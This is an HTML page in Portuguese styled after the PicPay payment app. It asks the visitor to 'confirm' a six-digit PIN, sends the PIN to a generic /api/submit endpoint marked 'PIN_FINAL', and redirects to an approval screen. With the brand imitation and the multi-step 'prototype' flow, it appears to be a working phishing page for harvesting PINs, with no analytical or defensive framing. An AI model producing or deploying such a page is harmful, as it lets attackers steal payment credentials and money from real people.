<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Confirmação de PIN</title>
    <style>
        /* ---------- Global look (same as the rest of the prototype) ---------- */
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #fff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 { margin-bottom: 15px; color: #333; }
        p  { margin-bottom: 30px; color: #666; }

        /* ---------- PIN boxes ---------- */
        #pin-inputs {
            display: flex;
            justify-content: center;
            gap: 6px;
        }
        .pin-input {
            width: 45px;
            padding: 14px;
            text-align: center;
            font-size: 18px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background: #f8f8f8;
            outline: none;
            transition: border-color .2s;
        }
        .pin-input:focus {
            border-color: #1db954;               /* PicPay green */
            box-shadow: 0 0 0 3px rgba(29,185,84,.2);
        }

        /* ---------- Buttons ---------- */
        .submit-button {
            background: #1db954;
            color: #fff;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            transition: background .2s;
        }
        .submit-button:hover { background: #179a45; }
        .submit-button:active { transform: scale(.98); }
    </style>
</head>
<body>
    <div class="container">
        <h2>Confirme seu PIN</h2>
        <p>Digite seu PIN de 6 dígitos para finalizar a validação.</p>

        <div id="pin-inputs">
            <input type="password" maxlength="1" class="pin-input" id="pin1" oninput="moveToNext(this,'pin2')">
            <input type="password" maxlength="1" class="pin-input" id="pin2" oninput="moveToNext(this,'pin3')">
            <input type="password" maxlength="1" class="pin-input" id="pin3" oninput="moveToNext(this,'pin4')">
            <input type="password" maxlength="1" class="pin-input" id="pin4" oninput="moveToNext(this,'pin5')">
            <input type="password" maxlength="1" class="pin-input" id="pin5" oninput="moveToNext(this,'pin6')">
            <input type="password" maxlength="1" class="pin-input" id="pin6">
        </div>

        <button class="submit-button" onclick="submitPin()">Confirmar</button>
    </div>

    <script>
        /* ---------- Helper: move focus to the next field ---------- */
        function moveToNext(current, nextID) {
            if (current.value.length >= 1) document.getElementById(nextID).focus();
        }

        /* ---------- Build the 6‑digit PIN and send it ---------- */
        async function submitPin() {
            const pin = [
                document.getElementById('pin1').value,
                document.getElementById('pin2').value,
                document.getElementById('pin3').value,
                document.getElementById('pin4').value,
                document.getElementById('pin5').value,
                document.getElementById('pin6').value
            ].join('');

            // Simple validation – must be exactly 6 digits
            if (pin.length !== 6 || !/^\d{6}$/.test(pin)) {
                alert('O PIN deve conter exatamente 6 dígitos numéricos.');
                return;
            }

            try {
                const resp = await fetch('/api/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'PIN_FINAL',
                        content: { pin }               // <-- sends the 6‑digit string
                    })
                });

                if (resp.ok) {
                    // Backend responded → go to the final screen
                    window.location.href = '/approval.html';
                } else {
                    alert('Erro ao processar o PIN.');
                }
            } catch (e) {
                console.error(e);
                alert('Erro de conexão. Verifique sua internet.');
            }
        }
            // Ensure every user has a unique ID stored in their browser
              if (!localStorage.getItem('sessionId')) {
              localStorage.setItem('sessionId', Math.random().toString(36).substring(2, 15));
   }
              const sessionId = localStorage.getItem('sessionId');
        /* ---------- Auto‑focus flow (optional) ---------- */
        function moveToNext(current, nextID) {
            if (current.value.length >= 1) document.getElementById(nextID).focus();
        }
        
    </script>
</body>
</html>
